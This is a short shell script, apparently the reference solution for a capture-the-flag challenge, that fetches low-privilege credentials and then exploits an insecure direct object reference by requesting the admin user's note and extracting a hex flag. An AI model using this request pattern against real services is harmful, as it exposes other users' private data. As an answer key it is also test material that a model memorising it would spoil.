#!/usr/bin/env sh
# Intended solution: fetch the low-priv creds, then exploit the IDOR on /notes
# by requesting the admin user's note. BASE is the backend's base URL (through
# the gateway, or http://localhost:8000 when run inside the backend container).
set -eu
BASE="${BASE:-http://localhost:8000}"

# 1. Low-privilege foothold.
curl -s "$BASE/creds" >/dev/null

# 2. IDOR: read a note that belongs to another user.
curl -s "$BASE/notes?user=admin" | grep -oE '[0-9a-f]{48}'
